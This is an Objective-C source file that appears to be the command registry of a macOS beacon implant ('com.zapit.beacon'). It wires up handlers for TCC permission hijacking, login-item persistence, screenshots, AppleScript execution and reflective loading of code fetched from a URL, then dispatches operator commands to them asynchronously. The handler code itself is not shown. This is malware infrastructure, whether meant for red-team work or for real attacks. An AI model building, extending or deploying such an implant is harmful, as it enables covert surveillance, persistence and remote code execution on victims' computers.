#import "ZCommandRegistry.h"
#import "commands/ZEchoCommandHandler.h"
#import "commands/ZDialogCommandHandler.h"
#import "commands/ZWhoAmICommandHandler.h"
#import "commands/ZTCCJackCommandHandler.h"
#import "commands/ZLoginItemCommandHandler.h"
#import "commands/ZTCCCheckCommandHandler.h"
#import "commands/ZScreenshotCommandHandler.h"
#import "commands/ZLSCommandHandler.h"
#import "commands/ZPWDCommandHandler.h"
#import "commands/ZAppleScriptCommandHandler.h"
#import "commands/ZReflectiveCommandHandler.h"

@interface ZCommandRegistry ()
@property (nonatomic, retain) NSMutableDictionary *handlers;
@property (nonatomic, retain) NSMutableDictionary *activeCommands;
@property (nonatomic, retain) dispatch_queue_t commandQueue;
@end

@implementation ZCommandRegistry

+ (instancetype)sharedRegistry {
    static ZCommandRegistry *sharedRegistry = nil;
    static dispatch_once_t onceToken;
    
    dispatch_once(&onceToken, ^{
        sharedRegistry = [[ZCommandRegistry alloc] init];
    });
    
    return sharedRegistry;
}

- (instancetype)init {
    self = [super init];
    if (self) {
        self.handlers = [[NSMutableDictionary alloc] init];
        self.activeCommands = [[NSMutableDictionary alloc] init];
        self.commandQueue = dispatch_queue_create("com.zapit.beacon.commands", DISPATCH_QUEUE_CONCURRENT);
        
        // Register command handlers
        [self registerHandler:[[ZEchoCommandHandler alloc] init]];
        [self registerHandler:[[ZDialogCommandHandler alloc] init]];
        [self registerHandler:[[ZWhoAmICommandHandler alloc] init]];
        [self registerHandler:[[ZTCCJackCommandHandler alloc] init]];
        [self registerHandler:[[ZLoginItemCommandHandler alloc] init]];
        [self registerHandler:[[ZTCCCheckCommandHandler alloc] init]];
        [self registerHandler:[[ZScreenshotCommandHandler alloc] init]];
        [self registerHandler:[[ZLSCommandHandler alloc] init]];
        [self registerHandler:[[ZPWDCommandHandler alloc] init]];
        [self registerHandler:[[ZAppleScriptCommandHandler alloc] init]];
        [self registerHandler:[[ZReflectiveCommandHandler alloc] init]];
    }
    return self;
}

- (void)dealloc {
    [_handlers release];
    [_activeCommands release];
    dispatch_release(_commandQueue);
    [super dealloc];
}

- (BOOL)registerHandler:(id<ZCommandHandler>)handler {
    if (!handler) {
        NSLog(@"Cannot register nil handler");
        return NO;
    }
    
    NSString *commandType = [handler command];
    if (!commandType || [commandType length] == 0) {
        NSLog(@"Cannot register handler with empty command type");
        return NO;
    }
    
    // Check if we already have a handler for this type
    if ([self.handlers objectForKey:commandType]) {
        NSLog(@"Handler for command type '%@' already registered", commandType);
        return NO;
    }
    
    [self.handlers setObject:handler forKey:commandType];
    NSLog(@"Registered handler for command type: %@", commandType);
    return YES;
}

- (BOOL)unregisterCommandHandlerForType:(NSString *)commandType {
    if (!commandType || [commandType length] == 0) {
        NSLog(@"Cannot unregister handler with empty command type");
        return NO;
    }
    
    if (![self.handlers objectForKey:commandType]) {
        NSLog(@"No handler registered for command type: %@", commandType);
        return NO;
    }
    
    [self.handlers removeObjectForKey:commandType];
    NSLog(@"Unregistered handler for command type: %@", commandType);
    return YES;
}

- (id<ZCommandHandler>)handlerForCommandType:(NSString *)commandType {
    return [self.handlers objectForKey:commandType];
}

- (BOOL)canHandleCommandType:(NSString *)commandType {
    return [self.handlers objectForKey:commandType] != nil;
}

- (BOOL)executeCommand:(ZCommandModel *)command 
           completion:(void (^)(BOOL success, NSDictionary *result, NSError *error))completion {
    if (!command) {
        NSLog(@"Cannot execute nil command");
        if (completion) {
            NSError *error = [NSError errorWithDomain:@"ZCommandRegistry" 
                                                code:201 
                                            userInfo:@{NSLocalizedDescriptionKey: @"Nil command"}];
            completion(NO, nil, error);
        }
        return NO;
    }
    
    NSString *commandType = [command type];
    id<ZCommandHandler> handler = [self handlerForCommandType:commandType];
    
    if (!handler) {
        NSLog(@"No handler registered for command type: %@", commandType);
        if (completion) {
            NSError *error = [NSError errorWithDomain:@"ZCommandRegistry" 
                                                code:202 
                                            userInfo:@{NSLocalizedDescriptionKey: [NSString stringWithFormat:@"No handler for command type: %@", commandType]}];
            completion(NO, nil, error);
        }
        return NO;
    }
    
    // For command line arguments, construct proper payload if needed
    if ([commandType isEqualToString:@"reflective"] && command.payload.count == 0) {
        // If we have command line arguments but no payload, construct it
        NSArray *args = [[NSProcessInfo processInfo] arguments];
        if (args.count > 2) {
            NSString *url = args[2]; // First arg after command type
            command = [[ZCommandModel alloc] initWithDictionary:@{
                @"id": command.commandId,
                @"type": command.type,
                @"payload": @{@"url": url}
            }];
        }
    }
    
    // Check if we can handle multiple commands of this type
    BOOL supportsMultiple = [handler respondsToSelector:@selector(supportsMultipleCommands)] && 
                          [handler supportsMultipleCommands];
    
    // Check if we already have an active command of this type
    NSString *commandId = [command commandId];
    NSMutableArray *activeCommandsOfType = [self.activeCommands objectForKey:commandType];
    
    if (!supportsMultiple && activeCommandsOfType && [activeCommandsOfType count] > 0) {
        NSLog(@"Handler for command type '%@' already has an active command and doesn't support multiple commands", commandType);
        if (completion) {
            NSError *error = [NSError errorWithDomain:@"ZCommandRegistry" 
                                                code:203 
                                            userInfo:@{NSLocalizedDescriptionKey: [NSString stringWithFormat:@"Handler for command type '%@' already has an active command", commandType]}];
            completion(NO, nil, error);
        }
        return NO;
    }
    
    // Add the command to the active commands list
    if (!activeCommandsOfType) {
        activeCommandsOfType = [[[NSMutableArray alloc] init] autorelease];
        [self.activeCommands setObject:activeCommandsOfType forKey:commandType];
    }
    [activeCommandsOfType addObject:command];
    
    // Update command status to in progress
    [command setStatus:ZCommandStatusInProgress];
    
    // Execute the command asynchronously
    dispatch_async(self.commandQueue, ^{
        [handler executeCommand:command completion:^(BOOL success, NSDictionary *result, NSError *error) {
            // Update command status based on result
            [command setStatus:success ? ZCommandStatusCompleted : ZCommandStatusFailed];
            
            // Remove from active commands
            NSMutableArray *cmdsOfType = [self.activeCommands objectForKey:commandType];
            if (cmdsOfType) {
                [cmdsOfType removeObject:command];
                if ([cmdsOfType count] == 0) {
                    [self.activeCommands removeObjectForKey:commandType];
                }
            }
            
            // Call the completion handler
            if (completion) {
                completion(success, result, error);
            }
        }];
    });
    
    return YES;
}

- (BOOL)cancelCommand:(ZCommandModel *)command {
    if (!command) {
        NSLog(@"Cannot cancel nil command");
        return NO;
    }
    
    NSString *commandType = [command type];
    NSString *commandId = [command commandId];
    id<ZCommandHandler> handler = [self handlerForCommandType:commandType];
    
    if (!handler) {
        NSLog(@"No handler registered for command type: %@", commandType);
        return NO;
    }
    
    if (![handler canCancelCommand]) {
        NSLog(@"Handler for command type '%@' doesn't support cancellation", commandType);
        return NO;
    }
    
    // Check if the command is active
    NSMutableArray *activeCommandsOfType = [self.activeCommands objectForKey:commandType];
    if (!activeCommandsOfType || ![activeCommandsOfType containsObject:command]) {
        NSLog(@"Command %@ is not active", commandId);
        return NO;
    }
    
    // Cancel the command
    BOOL cancelled = [handler cancelCommand:command];
    
    if (cancelled) {
        // Update command status to cancelled
        [command setStatus:ZCommandStatusFailed];
        
        // Remove from active commands
        [activeCommandsOfType removeObject:command];
        if ([activeCommandsOfType count] == 0) {
            [self.activeCommands removeObjectForKey:commandType];
        }
    }
    
    return cancelled;
}

@end 